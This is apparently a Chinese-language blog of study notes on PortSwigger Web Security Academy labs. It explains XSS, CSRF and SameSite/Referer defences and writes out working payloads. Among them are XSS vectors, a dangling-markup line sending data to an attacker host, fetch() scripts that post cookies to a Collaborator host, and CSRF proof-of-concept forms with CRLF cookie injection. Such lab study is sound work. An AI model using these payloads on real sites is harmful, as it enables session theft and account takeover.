---
title: burp lab
date: '2025-05-05 09:39:16'
updated: '2025-05-08 23:57:36'
permalink: /post/burp-lab-z1lidsv.html
comments: true
toc: true
---



# burp lab

## 跨站点脚本（XSS）

属于A03 注入的一种漏洞
是将用户的输入不将过滤、消毒地（或被绕过）拼接到HTML中，导致用户打开时会触发

### 分类

XSS攻击主要有三种类型

* 反射型XSS，恶意脚本来着当前的HTTP请求
* 存储型XSS，恶意脚本来着网站的数据库
* DOM XSS，存在客户端代码而不是服务器端代码中
  * 模板注入
  * 原型链污染

#### 反射型XSS

当应用在HTTP请求中接收数据并以不安全的方式将数据用在响应中时，就会发生这种情况
反射型XSS可能要诱导用户点击某个理解，产生一个请求，返回响应才会触发

#### 存储型XSS

当应用从不受信任的来源接收数据并以不安全的方式把这段数据用在之后的HTTP响应中时，就会出现这种情况
存储型XSS和反射性XSS的区别是存储型存在于应用本身中，无需用其他方法诱导用户做出什么行为，只要用户遇到就会触发

可能会通过HTTP请求提交给应用程序，例如评论，昵称等等

#### DOM XSS

这种XSS是不经过服务器的，在客户端直接解析，属于客户端的漏洞

> DOM是文档对象模型，是web浏览器上队页面上的元素的分层表示
> 网站用javascript来操作DOM的节点和对象及其属性
> 当网站包含javascript时，会获取攻击者可控制的值（称为**源**）并传递给危险函数（成为**接收者**），就会出现DOM漏洞

> 现在看到的有两种，一种是在运行脚本的时候注入，直接就用script，还有一种是用元素，比如onerror，onload等

可能导致DOM-XSS的接收器

> document.write()
> document.writeln()
> document.domain
> element.innerHTML
> element.outerHTML
> element.insertAdjacentHTML
> element.onevent

#### 悬垂标记注入

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

假设有这样一个不安全的网站，没有过滤或转义`>`或`""`字符，攻击者可以突破，但是网站有过滤器等策略，XSS无法实现

```html
"><img src='//attacker-website.com?
```

攻击者就会使用这种负载在发起悬垂标记注入攻击，攻击者创造了一个img标签，但是不关闭，这就是**悬空**，当浏览器解析响应时，会向前查找，直到遇到单引号终止，这之间的所有内容被视为URL的一部分，作为URL查询字符串发送到攻击者的服务器
这中间可能会包括敏感数据

### XSS上下文

在测试反射型和存储型XSS的时候，一个任务是识别XSS上下文

### 解决方案

#### 过滤消毒转义

* 过滤：通过白黑名单和关键词限制输入
* 消毒/转义：直接移除掉有害的代码，如`<script>`，`onerror`等，或将一些会被解析为HTML代码的字符显示为文本

#### 同源策略 `sop`

当浏览器从一个域向另一个域发送请求时，与另一个域相关的cookies就会作为请求的一部分发送，同源策略就是防止这种情况发生的

**同源策略**目的是防止网站相互攻击，规定了跨域之间的脚本是隔离的，一个域的脚本不能访问/操作另一个域的绝大部分属性和方法

> 两个关键原则
>
> **源匹配**：一个页面只能与其自身的源（协议、主机/域名、端口匹配）
>
> **同源检查**：是在源匹配的基础上进行的，当一个页面尝试访问自己网站需要的资源时，浏览器会检查这页面和这些资源是否来自相同的源，同源才能访问

#### 内容安全策略 `csp`

在同源策略的基础下，因为限制太强了，对一些大型网站的数据传递不太友好，所以有了内容安全策略

**内容安全策略**类似一种白名单，开发者明确告诉客户端，哪些外部资源是可以加载和执行的，降低注入漏洞的风险
默认情况下还会阻止内联脚本的执行（即HTML里的js），只有白名单或安全机制才能允许这些脚本执行

除了白名单外，CSP还有两种指定可信资源的方式

* nonce： CSP指令可以指定一个随机数，在加载脚本的标签中使用相同的随机数，如果值不对，就不会执行脚本，随机数要在每次加载页面时生成，且不能被攻击者猜到
* hashes： CSP指令指定受信任脚本的哈希值，如果实际脚本的哈希值和指定的哈希值不同，那么不会执行脚本

要启用CSP，响应需要包含一个HTTP响应标头，`Content-Security-Policy`标头使用包含策略的值调用，策略本身由一个或多个指令组成，以分号分割

* CSP只能限制`src`的请求

#### cors

cors是一种**W3C标准**，跨域资源共享

当进行cors通信时，是浏览器自动完成，当浏览器发现跨域请求的时候，会自动附加一些头信息，有时会多出一次附加的请求

> W3C标准：是web技术的蓝图（这个有点大了，感觉得单独记个笔记（摸））

#### cookie

SOP并不会阻止对cookie的读取，所以有了浏览器机制来防御

通过设置属性`Domain`，`Path`，`Secure`，`HttpOnly`来保护

`Domain`和`Path`是限制cookie的传递范围
`Secure`是明确cookie只能在HTTPS下传递
`HttpOnly`明确cookie只能由HTTP响应中的特殊标头`Set-Cookie`修改，不允许js代码对cookie进行**修改和读取**

#### HSTS

严格传输协议，只能在HTTPS协议下建立访问

#### content-type

这是一个HTTP标头，明确返回的资源类型，浏览器会对默认的HTML/JS/CSS渲染
明确了之后就可以避免

#### 内容嗅探机制

浏览器有一种机制，当浏览器识别到这个文件的类型，如图片，pdf等，可能会自动打开，如果在这里存在危险时，就会出现危害
当服务器带着`X-Content-Type-Options: nosniff`头响应时，面对`content-type`未设置的响应时，不会自动推断响应内容的类型

### 危害

* 冒充或伪装成受害者用户
* 执行用户能够执行的操作
* 读取用户访问的数据
* 捕获用户的seesion
* 对网站进行虚拟损毁
* 将木马功能注入网站

### burp实验

#### 实验：将 XSS 反射到 HTML 上下文中

直接在输入框输入`<script>alert(1)</script>`，搜索就会出现显示

#### 实验：将 XSS 存储到 HTML 上下文中

在评论中加入`<script>alert(1)</script>`，只要用户打开网页，就会出现这个弹窗

![](https://pic.imgdb.cn/item/670935e2d29ded1a8ce68cf3.png)

#### 实验：在 document.write 中使用源 location.search 的 DOM XSS

在网页的元素中可以看到输入的内容不仅在h1中出现了，还在img的src中出现了

![](https://pic.imgdb.cn/item/6709415dd29ded1a8cf0f4d0.png)

翻源代码，看到是直接用`document.write`把搜索的内容加入到img的src中，接下来就可以开始注入了

![](https://pic.imgdb.cn/item/6709419cd29ded1a8cf13002.png)

最开始只会用普通的`<script>alert(1)</script>`来实现，但是查看元素其实这个一直被封在冒号里面，是没有用的，没有想到，看了一眼答案，学到这种封装的思路（我自称的），将src这个元素封起来，一开始用的是`"><a href=x onerror=alert(1)>`这样的思路，发现一直不行，后面再看了眼，用的是onload这个事件，用`"><svg onload=alert(1)>`

最后发现自己思路又窄了，封了冒号后还是用script不就行了

```
"><script>alert(1)</script>
```

#### 实验：在select元素中使用源 location.search 的 document.write 漏洞导致的 DOM XSS

这里首先需要关注的是这个代码，这个其实和location.search的关系更大，这个是返回url程序的部分，然后后面get（'storeId'），把这个元素赋值给了store，可以发现后面就是把store加到selected中，所以就是要修改这个请求的url

![](https://pic.imgdb.cn/item/670a3432d29ded1a8ca2630d.png)

加上这一串就实现了

```
storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

#### 实验：在使用 location.search 作为源的 innerHTML 中发生 DOM XSS 漏洞

这里要看到就是这个js脚本，主要是找到id为searchMessage 的元素，然后用innerHML将query赋值给该元素的innerHTML属性![](https://pic.imgdb.cn/item/670a3737d29ded1a8ca6766e.png)

使用原来的方法，发现只是加进去了，但是没有触发，说明这个没在脚本里运行，就要换种方法

![](https://pic.imgdb.cn/item/670a3827d29ded1a8ca7a7b6.png)

这两种都行

```html
<svg onload="alert(1)">
<img src=1 onerror=alert(1)>
```

#### 实验：在 jQuery 中使用 location.search 作为源，锚点 (< a >) 的 href 属性发生 DOM XSS 漏洞

还是查找script元素找到了关键，用attr()是获取选择到的元素的属性值，这里就是href，将backlink元素的href修改为获取到的returnPath，这里就有是修改url了

这个attr就是jquery中的函数，是一个第三方库

![](https://pic.imgdb.cn/item/670a3ab0d29ded1a8caaf2c7.png)

![](https://pic.imgdb.cn/item/670a3b99d29ded1a8cac12bf.png)

然后尝试注入，但是没法处理这个href，无法封起来，这是jquery的原因

然后学习到了在href中是可以加入**javascript:** 来添加命令的
当添加一个javascript:alert(document.cookie)然后再点击这个连接，就成功触发了

#### 实验：使用 hashchange 事件在 jQuery 选择器接收器中引发 DOM XSS

> hashchange事件：当修改url哈希值，也就是在url中 **#** 号后面的部分，触发这个事件
>
> 单页面模式

这个是在hash变动时，选择blog-list的h2，contain中是用来搜索的，里面先url解码，获取到变动的hash值，分割前面的#号
如果后面是对应的文章，就滑动过去

这里提到contain方法如果注入的是一个标签而不是字符串，他会创建一个对应的标签

![](https://pic.imgdb.cn/item/670a5507d29ded1a8cc8cacb.png)

知道这个漏洞之后就要在hash处注入就行，但是这样是不可能诱导用户做出这样的行为

```url
https://0a75009503343b2680d92b4f006e0062.web-security-academy.net/#%3Cimg%20src%20=1%20onerror=alert(1)%3E
```

所以会用一个iframe来操作，当这个iframe加载成功后就会给自己加上这个hash，就会触发这个注入

```html
<iframe src="https://0a79000a035d62a88083c653000100af.web-security-academy.net/#" onload= "this.src+= '<img src = x onerror = print()>' "></iframe>
```

#### 实验：在 AngularJS 表达式中使用尖括号和双引号进行 HTML 编码的 DOM XSS

在AngularJS框架中，可能无需尖括号或事件即可执行javascript，这个框架在2022年变成了Angular框架，这个框架中，用`{{}}`可以直接执行中间的js代码

使用的是这个代码

```js
{{$on.constructor('alert(1)')()}}

首先这个{{ }}是因为在这个框架中使用这个就可以使用js代码，如{{1+1}}就会出现2

然后$是一种框架的约定，本身是没有意义的，只是用作方法的前缀，而后面接的这个方法是无所谓的，只要是这个框架能使用的就行，比如 $eval

在javascript中，可以使用 Function("alert()");来动态创建一个函数，但是如果不命名的话就无法使用，如果在最后加上一个(),如 Function("alert()")(); 就会调用这个函数

constructor是在js中每个函数都会有的属性，指向函数的构造函数，这个是意思是在js中，每个函数都是通过js内置的Function构造函数创建的，所以一个函数的constructor属性返回的就是Function，我们就可以用这个创建一个新函数
```

总结，这个代码是使用任意js内置函数的constructor属性创建一个新函数，然后用()调用，最后用{{ }}执行

#### 实验：反射 DOM XSS

尝试了几次输入，感觉被转义了，无法直接注入，但是在几个网页来回找了一下没找到对应的js代码

一开始看的burp的提示在burp的站点地图里能看到对应的代码，后来发现在网络里也能看到（忘了orz

![](https://pic.imgdb.cn/item/670f2e99d29ded1a8ccd1b2e.png)

上面的xhr会在接收到搜索信息的时候发送一个请求，在这个代码中，xhr使用response传递的是一个字符串而不是对象，就是下面响应的json其实是字符串，在js中，json的值可以为函数
然后这里使用的是**eval**函数去拼接这个json，但是在这里json是个字符串，是一个js对象，可以被加入函数在值里
所以在看到eval的时候可以联想到这个是很容易被注入的，因为eval接收的是字符串类型

![](https://pic.imgdb.cn/item/670f308bd29ded1a8ccecde3.png)

尝试跳出这个字符串，失败了，因为这个json响应会自动转义`""`在js中，会在符号前加上一个`\`来转义

![](https://pic.imgdb.cn/item/670f30e9d29ded1a8ccf0cda.png)

但是后面还有}封装，可以用`//`注释掉

![](https://pic.imgdb.cn/item/670f3481d29ded1a8cd1c03e.png)

![](https://pic.imgdb.cn/item/670f34dfd29ded1a8cd1fdab.png)

所以最后使用的是`\"-alert(1)}//`来注入XSS的，这个减号是js语法的一部分，用来规避过滤器或混淆代码解析器

#### 实验：存储型 DOM XSS

找到js脚本，发现替换了<>号

![](https://pic.imgdb.cn/item/671102cfd29ded1a8c47472e.png)

但是在实验的时候发现好像只会替换掉第一个，后面的还存在

![](https://pic.imgdb.cn/item/67110357d29ded1a8c47d8e5.png)

于是使用`<>< img src = 1 onerror=alert(1) >`成功注入

这个的原因是replace在替换字符串的时候只会替换第一个出现的，后面的不会受影响，如果要替换所有的，需要用正则表达式

#### 实验：将反射型 XSS 注入 HTML 上下文，并阻止大多数标签和属性

一开始测试，发现之前用的方法基本都被ban了，用burp开始测试

将搜索发送到intructor，在<>间加入负载，用[XSS 备忘单](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)里的tag进行攻击，发现只有body这个参数是没有被过滤掉的，然后修改为< body $$=1 >进行攻击，用event，发现onresize是没有被过滤的，这个函数是当修改窗口大小的时候会触发

这里的onload是为了改变窗口触发onresize

```html
<iframe src="https://0a78008f0465726a8035085400f60036.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload=this.style.width='100px'>
```

#### 实验：将 XSS 反射到 HTML 上下文中，除自定义标签外，所有标签均被阻止

这个实验名就提示用自定义标签

这个是用一个自定义标签，然后onfocus是获得焦点时触发，tabindex使这个元素可以被聚焦

```html
<custom-tag id = "x" onfocus="alert(document.cookie)" tabindex="1">
```

如果url末尾的hash加上了这个id会立即关注这个元素，触发事件

#### 实验：允许使用一些 SVG 标记的反射型 XSS

攻击得到以下标签是没被过滤的

![](https://pic.imgdb.cn/item/67121630d29ded1a8c82cf08.png)

< animatetransform >标签是用在< svg >< /svg >中间的

onbegin是在触发这个移动后会执行的

![](https://pic.imgdb.cn/item/671219e7d29ded1a8c8b0b5b.png)

所以就能注入

```
<svg><animatetransform onbegin=alert()>
```

#### 实验：将 XSS 反射到带有尖括号 HTML 编码的属性中

输入内容，发现数据就在这里，封装""尝试注入

![](https://pic.imgdb.cn/item/67121d09d29ded1a8c8ed21f.png)

成功加入一个事件，但是这个没有用，修改成`onmouseover`，当鼠标悬停的时候就会触发

![](https://pic.imgdb.cn/item/67121d34d29ded1a8c8ef7dc.png)

```
test" onmouseover="alert(1)
```

#### 实验：将存储型 XSS 注入锚点的 href 属性，并使用双引号进行 HTML 编码

看到href想起前面用的javascript

测试发现在href里的值是我们自己输入的，所以只要修改href为javascript:alert()就可以注入

![](https://pic.imgdb.cn/item/671223c7d29ded1a8c968960.png)

#### 实验：规范链接标签中的反射型 XSS

网站没有可以注入的地方，可以在url本身注入

```
https://0a080099043ff54983db550600f6007f.web-security-academy.net/?marin
```

![](https://pic.imgdb.cn/item/67122602d29ded1a8c9bd7c8.png)

可以发现已经注入到里面了，那么测试能否突破href

* 这里查看页面源代码更好一点

成功突破，但是这里注入是在head里，是没办法被看见的，所以点击事件无法触发

![](https://pic.imgdb.cn/item/67122686d29ded1a8c9cfa3a.png)

实验室给了提示，假设用户会按下`ALT+SHIFT+X` 使用**accesskey**来定义一个字符，按下组合键就会触发事件

```
?' accesskey='x' onclick='alert()
```

#### 实验：将反射 XSS 注入到带有单引号和反斜杠转义的 JavaScript 字符串中

注入发现有两个地方存在，尝试突破上面的`''`不行

![](https://pic.imgdb.cn/item/67124c5ad29ded1a8cd3cf9a.png)

突破下面，使用 `< /script >`成功突破，接着注入就行，因为这里没有转义`<>`关闭script可以突破`''`

![](https://pic.imgdb.cn/item/67124cdcd29ded1a8cd449cd.png)

`<script>`会寻找离自己最近的`</script>`，哪怕中间有`<script>`也会被包括到里面

#### 实验：将反射XSS 注入带有尖括号 HTML 编码的 JavaScript 字符串

这个和上面比只是加了`<>`转义，少了另外两个，无法突破script

这里其实就是突破`''`就行

使用这个成功突破

```
';alert();var a='test
```

这个也可以突破

```
'-alert()-'
```

#### 实验：将反射型 XSS 注入 JavaScript 字符串，其中尖括号和双引号被 HTML 编码，单引号被转义

遇到这种应该先思考什么东西没有被影响，这里有`<>` ，`""` ，`''`无法用来突破了，但是`/`没有被影响

这里和前面的反射型DOM XSS的解法一致

```
\' + alert() //
```

使用 `\` 转义用来转义`'`的`\` 用两个`/`注释掉后面的单引号和分号

#### 实验：将存储型 XSS 注入到 `onclick` 事件，其中尖括号和双引号被 HTML 编码，单引号和反斜杠被转义

这个的要求是注入到onclick事件中，那么就是要在输入的website中突破onclick事件中的track的单引号，但是这里的好像都被处理了

![](https://pic.imgdb.cn/item/67162bd9d29ded1a8c2cd16a.png)

但是在html中，可以使用html编码来绕过转义，在html中`&apos;`会被html编码成单引号，所以无法进行转义，而在执行js代码之前，浏览器会先决心解码，变成了单引号，成功注入

```
http:111&apos;-alert()&apos;
```

#### 实验：将反射型 XSS 注入模板字面量，其中尖括号、单引号、双引号、反斜杠和反引号被 Unicode 转义

javascript模板文字是允许嵌入javascript表达式的字符串文字，嵌入的表达式会被运行或求出值，然后连接到文本中
模板文字用**` `` `**封装，并且使用 **`${    }`**语法来识别表达式

成功注入

![](https://pic.imgdb.cn/item/6716304cd29ded1a8c36b38f.png)

#### 实验：利用XSS窃取 Cookie

这个实验的网站没有对符号进行限制

这个实验要用到burp的collaborator模块

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

这里的脚本是因为用户在访问这里的时候会带上cookie，这个脚本只要访问了这个评论的页面就会触发这个脚本，将cookie的信息发送到burp中

#### 实验：利用XSS获取密码

这个实验的网站没有对符号进行限制，但是要获取密码不懂，直接看的解法

这个实验也要用到burp的collaborator模块

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

具体解释：
两个input框是为了让用户输入账号密码的，但是其实用户不会在这种地方输入，有两种情况，一种是使这个输入框足够正式，能够骗过用户，还有一种是用户在进入这个页面时肯定已经登录成功，遇到这个输入框，浏览器会为了用户方便自动输入
而一旦自动输入，`onchange`属性检测到了改变了长度，就会发送请求，我们将这个网站用改为burp的collaborator，**fetch**将用户信息作为请求体发送过去
`mode: 'no-cors'`是避免浏览器阻止跨域请求

成功获得密码

![](https://pic.imgdb.cn/item/67164b26d29ded1a8c65901f.png)

#### 实验：利用XSS执行CSRF

登录账号，发送修改邮箱的请求，查看请求体，发现要验证cookie和csrf，所以要先利用xss获取这两个，但是发现其实发送这个需改邮箱的请求，只需要csrf令牌就行，因为当用户访问到我的脚本的时候，网站会自动带上cookie，所以不用管cookie

![](https://pic.imgdb.cn/item/6718dd41d29ded1a8cda58a8.png)

回到网站，查看代码，发现csrf的令牌在这个里面是可以看到的

![](https://pic.imgdb.cn/item/6718e2bcd29ded1a8ce0d1de.png)

```js
<script>
    window.addEventListener('DOMContentLoaded',function(){
    var token = document.getElementsByName('csrf')[0].value;
    
    var data = new FormData();
    data.append('csrf',token);
    data.append('email','evil@hacker.net');
    
    fetch('/my-account/change-email',{
        method:'POST',
        mode:'no-cors',
        body:data
    });
}); 
</script>
```

## 跨站请求伪造（CSRF）

这是一种网络安全漏洞，攻击者通过利用这种漏洞诱导用户执行他们不想执行的操作，允许攻击者规避部分同源策略

与XSS的区别，XSS是利用应用内的信任用户，而CSRF是通过伪造成受信任用户请求网站

可能可以按请求方式分为GET和POST两种

CSRF还有个令牌，是由服务器端应用生成并与客户端共享的唯一、秘密且不可预测的值，在发出敏感信息的时候要包含正确的CSRF令牌
与客户端共享的方法是作为隐藏参数包含在HTML中
但是一般是POST请求时，会验证令牌，使用GET会跳过验证

### 攻击方式

要发起CSRF攻击，需要满足三个条件

* 相关操作：应用中存在攻击者有理由诱发的操作，可能是特权操作（例如修改其他用户信息）或针对用户特定
* 基于cookie的会话处理：执行操作涉及发出一个或多个HTTP请求，应用**仅依靠会话的cookie参数**来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求或者验证的参数都可以被攻击者猜测到）
* 没有不可预测的请求参数：执行操作的请求不包含任何攻击者无法确定或猜测其值的参数（例如，当导致用户更改密码时，如果要攻击者知道现有密码的值，则无法利用CSRF）

要被CSRF攻击，要有两个条件

* 登录受信任的网站A，在本地产生Cookie
* 不登出A的情况下，访问危险网站B

### 解决方案

#### SameSite coolie限制

这是一种浏览器机制，用于告诉浏览器一个网站的cookie在访问哪些网站的请求时要带上

##### SameSite属性

Cookie的SameSite属性可以设置三个值 `Strict`、`Lax`、`None`

```
Set-Cookie: sessionid=abc123; SameSite=Strict
```

* Strict（严格模式），只有在同一站点请求时才会发送
* Lax（宽松模式），允许部分跨站请求携带cookie，但是只有在用户通过连接导航到站点时才会发送cookie，但是要满足两个条件
  * 请求使用**get**方法
  * 请求源自用户的顶级导航，指用户在浏览器中直接发起的页面跳转
* None，相当于没有限制

##### 站点

在带有SameSite coolie限制的上下文中，**站点（TLD+1）**​****被定义为****​**顶级域名**（TLD）加上**一级子域名**，例如`app.example.com`的站点是`example.com`，SameSite coolie策略限制了在不同**站点**请求中cookie的发送
同时，还会检查**域名**和**URL协议**，不同的URL协议也会被视为跨站点请求

##### 站点和源的区别

是否同源要观察的是url的协议，域名和端口都要相同
而同站点只需要观察顶级域名和一级子域名以及url协议

|请求来自|请求到|同一站点？|同源？|
| -----------------------| ----------------------------| ----------| ------|
|https://example.com|https://example.com|是|是|
|https://app.example.com|https://intranet.example.com|是|否|
|https://example.com|https://example.com:8080|是|否|
|https://example.com|https://example.co.uk|否|否|
|https://example.com|http://example.com|否|否|

#### 基于Referer的csrf防御

一些应用会使用HTTP的**Referer**标头来防御，来验证请求是否来自自己的域不过经常会被绕过

* 有些网站对这个的验证依赖于标头，如果省略了标头，就会跳过验证
* 还有一些应用会只以简单的方式检测标头，比如只检测是否以预期值开头

### 判断CSRF漏洞

* 获取一个正常请求的包，查看有没有**Referer**或**token**字段，如果没有，那么极有可能有漏洞
* 如果有**Referer**字段，但是去掉这个后访问仍然有效，那么也有可能

### burp实验

#### 实验：无防御的 CSRF 漏洞

这个实验要修改用户的邮件

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="marin@email">
</form>

<script>
        document.forms[0].submit();
</script>
```

需要创造一个连接用来伪造危险网站，用户在进入这个的时候要是登录的目标网站，就会发送请求并携带相关的cookie

> **&lt; from &gt;**​****标签是通过用户填写数据，通过提交按钮将数据发送到服务器，这个用POST请求发送请求到****​**action**的网站
>
> * `GET`：将数据附加到URL，适用于获取数据的请求（如搜索）
> * `POST`：将数据放在请求体中，适用于提交数据的请求（如用户登录、文件上传）
>
>  **&lt; input &gt;**​****标签是输入数据，然后被隐藏起来，名称是email，直接赋值****​**value**的值
>
>  **&lt; script &gt;** 标签 **document.forms[0].submit();** 是自动提交页面上的第一个表单（**forms[0]** ）无需用户交互

#### 实验：CSRF的中令牌验证取决于请求方法

在burp中测试，发现get请求也可以修改邮箱，

![](https://pic.imgdb.cn/item/671a3a51d29ded1a8c0e6555.png)

接着测试去掉csrf令牌，发现也可以修改，那只要用户登录的时候点击一个发送get请求的链接就可以修改邮箱

```html
<form method="GET"action="https://0a68004303a5205381c0cf92000a0043.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="marin@email">
</form>

<script>
        document.forms[0].submit();
</script>
```

我以为只要修改action中的后面的问号才行，结构GET会自动将表单数据附加到URL中，形成查询字符串类似`?email=marin@email`

#### 实验：CSRF的令牌验证取决于令牌是否存在

蚌，那和最开始的一样（

```html
<form method="POST"action="https://0a3000f204c8a1a782edbbf9009a00a8.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="marin@email">
</form>

<script>
        document.forms[0].submit();
</script>
```

#### 实验：令牌与用户会话无关的 CSRF

就是这个应用只验证csrf令牌，不会验证是否是同一个会话，也就是cookie不检测

csrf令牌是使用一次就会重新生成，那我们拿攻击者的csrf

这个过程就是，我们先登录攻击者的账户，获取到攻击者的csrf值，将这个值用在这个请求中，然后受害者登录，打开这个网页，就会发送这个更改的请求，同时因为只检测csrf令牌，通过了之后就会修改受害者的邮箱

```html
<form method="POST"action="https://0a9d00b604ce92e680222bca00090048.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="marin@email">
	<input type='hidden' name="csrf"  value="1NtpBVEwUhUFQ2RmxwUnq67RU4pwQQGV"> 
</form>

<script>
        document.forms[0].submit();
</script>
```

#### 实验：令牌与非会话 cookie 绑定的 CSRF

这个看描述的时候没看懂，看了请求，发现里面有两个csrf参数，一个是csrf，在请求体中，还有一个是csrfkey，在cookie中

这里的思路是一个个测试
1.只修改csrf参数，改成错误的，无法请求
2.修改csrf参数成另一个用户的，也无法请求
3.修改csrfkey成错误的，也无法请求
4.修改csrfkey成另一个用户的，无法请求
5.将csrf参数和csrfkey都修改成另一个用户的，请求成功

所以这里的意思就是csrfkey和csrf参数是绑定的，但是和cookie不绑定，所以只需要随便一个用户的这两个值，就可以修改任何用户的邮箱

然后就是攻击了，后面csrf参数和前面是一样的，但是前面的csrfkey的获取是未知的

发现在这个实验室有个搜索框，解决办法就是通过这个注入来修改csrfkey变成已知的

![](https://pic.imgdb.cn/item/671b5f24d29ded1a8cf7d4c3.png)

然后就是注入了

```html
<form method="POST"action="https://0a4700cb03cf5c48825d1bc600cc0011.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="marin@email">
    <input type='hidden' name="csrf"  value="UZK0tfHc5f5IwAFJJ2z9H6ivA5u93ZUd"> 
</form>

<img src="https://0a4700cb03cf5c48825d1bc600cc0011.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%20" onerror="document.forms[0].submit()">
```

先通过和之前实验一样的方法加入请求体
然后不同是不再是直接提交表单，而是先用一个img标签通过搜索修改csrfkey的值，然后再提交表单这样就成功修改了

 **%0d%0a**代表一个完整的换行符序列
 **%3b**是分号

#### 实验：cookie 中存在重复 token 的 CSRF

这里有两个参数，csrf和csrfkey，但是发现这两个参数的值是一样的，尝试修改值，确保两个值相等，发现也能修改邮箱，所以无需csrf值，只要两个值相同就行

![](https://pic.imgdb.cn/item/671c59c4d29ded1a8cbfb14a.png)

```html
<form method="POST"action="https://0a4700cb03cf5c48825d1bc600cc0011.web-security-academy.net/my-account/change-email">   
    <input type="hidden" name="email" value="marin@email">    
    <input type='hidden' name="csrf"  value="mairn"> 
</form>

<img src="https://0a4700cb03cf5c48825d1bc600cc0011.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=marin%20" onerror="document.forms[0].submit()">
```

确实能改邮箱，但是不知道为啥一直过不了，上面的也是

#### 实验：通过方法覆盖绕过 SameSite Lax

先修改邮箱，查看请求，发现没有设置SameSite，所以默认是**Lax**属性，那么只能通过GET请求修改才会有cookie

使用正常的POST请求的代码，发现发送后会要求重新登录，那就只能修改为GET请求，但是修改邮箱这里无法触发

![](https://pic.imgdb.cn/item/67219d56d29ded1a8cd8e7d7.png)

使用这个成功绕过
`_method`方法是用来修改请求方法的
所以一开始是GET请求，就会带上cookie，但是又被服务器视为为POST请求

```html
<html>
<body>
    <form action="https://0ad900560409f1be8099537a002800bc.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="112123432&#64;1" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```

#### 实验：通过客户端重定向绕过 SameSite Strict

这里的限制被设置为Strict，按理来说只要不是同站点的请求就不会带上cookie

![](https://pic.imgdb.cn/item/67219fa8d29ded1a8cdb10e1.png)

题目提示是使用客户端重定向来绕过这个限制，在这个网页中，在博客下面评论后就会重定向回页面

在这个重定向js中，会获取url的postId的值，并组装到url中

```js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

所以我们可以尝试修改payload来修改邮箱

```
1：
/post/comment/confirmation?postId=my-account/
因为前面有个post，所以找不到这个页面

2.
/post/comment/confirmation?postId=../my-account/
成功到达账户页面

3.
/post/comment/confirmation?postId=../my-account/change-email?email=1%401%26submit=1
这里的%26是&的url编码
```

最后的漏洞利用

```html
<script>
	window.location = "https://0a6700e604da79818384460a00d600d9.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=1%401%26submit=1";
</script>
```

成功

#### 实验：通过同级域名绕过SameSite Strict(*)

涉及websocket劫持，先放一下

#### 实验：通过 cookie 刷新绕过 SameSite Lax

如果没有设置SameSite的属性，就会默认是Lax，但是是在2分钟之后才会触发，所以在登录2分钟之内是没有限制的，所以如果能刷新cookie就可以执行csrf攻击

这里的攻击有两部分，第一部分和之前的类似，向修改邮箱的站点发送POST请求

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
```

第二部分，是创建一个点击事件，点击页面的任意一个地方，就会打开登录的页面，这个页面基于Oauth的登录，这个就是这个登录的站点，然后就回触发事件，提交第一部分的请求

这里是因为触发Oauth登录时，会创建新的会话cookie，即使已经登录，然后再请求原站点就会带着这个cookie，是有效的，用点击事件是因为用弹出窗口会被拦截器拦截，阻止强制刷新cookie

```html
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

#### 实验：CSRF其中 Referer 验证取决于是否存在标头

修改邮箱，在burp中尝试发送请求，把referer标头删了，发现可以修改邮箱，所以只要能在发送请求的时候把这个标头无效就成功了

这里和前面比只增加了**head**标签中的**meta**标签，通过这个设置，我们可以控制从当前页面发起的请求不带有referer头，至于为什么是**referrer**是因为在一开始定义的时候就出错了，一直被保存下来

```html
<head>
    <meta name="referrer" content="no-referrer">
</head>
<form method="POST"action="https://0a3000f204c8a1a782edbbf9009a00a8.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="marin@email">
</form>

<script>
        document.forms[0].submit();
</script>
```

#### 实验：使用损坏的 Referer 验证绕过 CSRF 保护

这个绕过是利用了这个网站验证referer时只验证里面是否有预期的域，不管形式是什么样的，只要存在就行

```html
<script>
history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
</script>
<form method="POST"action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="marin@email">
</form>

<script>
        document.forms[0].submit();
</script>
```

在这里有个新的语法，我们这里不会修改整个url，而是会修改路径变为整个查询参数

这个是用来修改当前页面的url但是不会重新加载页面

```javascript
history.pushState(state, title, url);
```

* state：状态对象，可以为空
* title：新页面的标题，可以为空
* url：用来替换当前url的新url

在这个实验中，还要在头上加上，因为浏览器会自动从referer标头删除查询字符串

```
Referrer-Policy: unsafe-url
```

所以绕过了检查

## 服务器端请求伪造（SSRF）

这是一种网络安全漏洞，攻击者的操作会导致服务器端应用向非预期位置发出请求
一般来说，ssrf攻击的目标是从外网无法访问的内部系统，因为请求是从服务端发起的，可以请求到和他相连的但外网无法访问的内部系统

